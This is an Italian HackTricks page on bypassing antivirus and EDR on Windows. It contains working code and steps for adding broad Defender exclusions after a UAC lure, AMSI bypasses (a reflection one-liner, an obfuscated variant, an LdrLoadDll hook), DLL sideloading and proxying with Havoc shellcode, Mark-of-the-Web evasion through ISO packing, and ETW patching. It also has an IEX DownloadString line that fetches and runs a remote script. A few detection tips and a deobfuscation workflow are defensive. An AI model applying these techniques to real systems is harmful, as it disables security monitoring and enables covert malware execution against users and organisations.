# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Disabilitare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire a Windows Defender di funzionare fingendo un altro AV.
- [Disabilitare Defender se sei admin](basic-powershell-for-pentesters/README.md)

### Esche UAC in stile installer prima di manomettere Defender

I public loaders che si spacciano per game cheats spesso vengono distribuiti come installer non firmati in Node.js/Nexe che prima **chiedono all'utente l'elevazione** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verifica il contesto amministrativo con `net session`. Il comando ha successo solo quando chi lo esegue ha diritti admin, quindi un fallimento indica che il loader è in esecuzione come utente standard.
2. Si rilancia immediatamente usando il verbo `RunAs` per innescare la prevista richiesta di consenso UAC preservando la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di star installando software “cracked”, quindi la richiesta viene di solito accettata, concedendo al malware i diritti necessari per modificare la policy di Defender.

### Esclusioni generali `MpPreference` per ogni lettera di unità

Una volta elevati i privilegi, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare il servizio del tutto. Il loader prima termina il GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) e poi applica **esclusioni estremamente ampie**, così ogni profilo utente, directory di sistema e disco rimovibile diventa non scansionabile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni principali:

- Il loop scansiona ogni filesystem montato (D:\, E:\, chiavette USB, ecc.) quindi **qualsiasi payload futuro lasciato da qualche parte su disco viene ignorato**.
- L'esclusione per l'estensione `.sys` è proiettata al futuro—gli attaccanti si riservano l'opzione di caricare driver non firmati più tardi senza dover toccare Defender di nuovo.
- Tutte le modifiche finiscono sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di confermare che le esclusioni persistono o di espanderle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli di integrità ingenuamente continuano a riportare “antivirus attivo” anche se l'ispezione in tempo reale non tocca mai quei percorsi.

## **Metodologia di evasione AV**

Attualmente, gli AV usano diversi metodi per verificare se un file è maligno o meno: rilevazione statica, analisi dinamica, e per gli EDR più avanzati, analisi comportamentale.

### **Rilevazione statica**

La rilevazione statica si ottiene segnalando stringhe note o array di byte maligni in un binario o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti beccare più facilmente, poiché probabilmente sono già stati analizzati e segnalati come maligni. Ci sono un paio di modi per aggirare questo tipo di rilevazione:

- **Crittografia**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decrittare ed eseguire il programma in memoria.

- **Offuscamento**

A volte tutto ciò che serve è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può richiedere molto tempo a seconda di cosa stai cercando di offuscare.

- **Tooling personalizzato**

Se sviluppi i tuoi strumenti, non ci saranno firme conosciute malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare la rilevazione statica di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno singolarmente; in questo modo può dirti esattamente quali stringhe o byte sono stati segnalati nel tuo binario.

Ti consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su AV Evasion pratico.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. tentativi di decrittare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata con cui lavorare, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Dormire prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica degli AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Controllare le risorse della macchina** Di solito le sandbox hanno pochissime risorse con cui lavorare (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Puoi anche essere molto creativo qui, per esempio controllando la temperatura della CPU o anche la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Controlli specifici per la macchina** Se vuoi mirare a un utente la cui workstation è unita al dominio "contoso.local", puoi verificare il dominio del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far terminare il tuo programma.

Si scopre che il nome del computer della Sandbox di Microsoft Defender è HAL9TH, quindi puoi verificare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH significa che sei dentro la sandbox di Defender, perciò puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto e che dumpa comunque LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei pezzi di malware più segnalati dagli AV e dagli EDR; mentre il progetto in sé è molto valido, è anche un incubo lavorarci attorno per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un AV particolare, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, dai sempre priorità all'uso di DLL per l'evasione; secondo la mia esperienza, i file DLL vengono solitamente **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare la rilevazione in alcuni casi (se il tuo payload ha modo di essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un tasso di rilevazione di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevazione di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me di un normale payload Havoc EXE vs un normale payload Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che i payload malevoli fianco a fianco.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando stamperà la lista dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**, questa tecnica è piuttosto stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente scoperto.

Semplicemente posizionando una DLL malevola con il nome che un programma si aspetta di caricare, non verrà caricato il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma esegue dalla DLL proxy (e malevola) alla DLL originale, preservando la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) che la proxy DLL hanno un tasso di rilevamento di 0/26 su [antiscan.me](https://antiscan.me)! Lo definirei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio **vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso degli Export inoltrati (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che sono in realtà "forwarders": invece di puntare a codice, l'entry dell'export contiene una stringa ASCII della forma `TargetDll.TargetFunc`. Quando un caller risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già caricata
- Risolve `TargetFunc` da essa

Comportamenti principali da capire:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato l'ordine di ricerca DLL normale, che include la directory del modulo che sta effettuando la risoluzione del forward.

Questo abilita una primitiva di sideloading indiretto: trova una DLL firmata che esporta una funzione inoltrata verso un nome di modulo non-KnownDLL, quindi colloca accanto quella DLL firmata una DLL controllata dall'attaccante con esattamente lo stesso nome del modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la tua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è un KnownDLL, quindi viene risolto tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` malevolo nella stessa cartella. Un DllMain minimale è sufficiente per ottenere code execution; non è necessario implementare la forwarded function per far scattare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica il side-by-side `keyiso.dll` (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader poi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementato, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per il rilevamento:
- Concentrati sui forwarded exports dove il modulo di destinazione non è una KnownDLL. KnownDLLs sono elencate sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per rilevamento/mitigazione:
- Monitorare LOLBins (e.g., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnalare catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applicare politiche di integrità del codice (WDAC/AppLocker) e negare write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto con il topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AVs erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, poiché non aveva abbastanza visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o installazione ActiveX)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non criptata e non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come preceda con `amsi:` e poi il percorso all'eseguibile da cui lo script è stato avviato, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati intercettati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo riguarda persino `Assembly.Load(byte[])` per esecuzioni in-memory. Per questo motivo è consigliato usare versioni .NET più basse (come la 4.7.2 o inferiori) per l'esecuzione in-memory se si vuole evadere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, modificare gli script che tenti di caricare può essere un buon modo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di deobfuscate gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo la rende non così semplice da eludere. Sebbene, a volte, tutto ciò che serve è cambiare un paio di nomi di variabili e puoi cavartela, quindi dipende da quanto qualcosa è stato flaggato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per evadere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenire un uso più esteso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga è stata ovviamente segnalata dallo stesso AMSI, quindi è necessaria qualche modifica per poter utilizzare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Memory Patching**

Tieni presente che probabilmente questo verrà segnalato una volta pubblicato, quindi non dovresti pubblicare codice se il tuo obiettivo è rimanere non rilevato.

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Per una spiegazione più dettagliata leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

There are also many other techniques used to bypass AMSI with powershell, check out [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocco di AMSI impedendo il caricamento di amsi.dll (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio è piazzare un hook in user‑mode su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono effettuate scansioni per quel processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

Questo strumento [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) genera anche script per bypassare AMSI.

**Rimuovere la firma rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la firma AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della firma AMSI e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che utilizzano AMSI**

Puoi trovare una lista di prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per audit e risoluzione dei problemi, ma può anche essere un **problema per attackers che vogliono evadere la rilevazione**.

Per bypassare PowerShell logging, puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Use Powershell version 2**: Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi fare così: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell senza difese (questo è ciò che usa `powerpick` di Cobal Strike).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenta l'entropia del binario rendendo più facile la rilevazione da parte di AV ed EDR. Fai attenzione a questo e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune trovare diversi livelli di protezione che bloccheranno decompilatori e sandbox. Il workflow qui sotto ripristina in modo affidabile un IL quasi-originale che può successivamente essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo inoltre patcha il checksum PE quindi qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati criptate, recuperare le XOR keys e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando si costruisce il proprio unpacker.

2.  Symbol / control-flow recovery – dai in input il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decifrerà le stringhe costanti.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (aka *proxy calls*) per rompere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Manual clean-up – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il campione malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a compile time, obfuscated code senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge uno strato di obfuscated operations generate dal C++ template metaprogramming framework che renderà la vita della persona che vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di offuscare diversi file PE, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di fine-grained code obfuscation per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in ROP chains, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da Internet e li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni raramente scaricate attiveranno SmartScreen avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al momento del download di file da Internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica del Zone.Identifier ADS per un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ottengano il Mark of The Web è impacchettarli all'interno di un contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in contenitori di output per evadere il Mark-of-the-Web.

Esempio d'uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo per bypassare SmartScreen impacchettando payloads dentro file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Simile a come viene disabilitato (bypassed) AMSI, è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando effettivamente il logging ETW per quel processo.

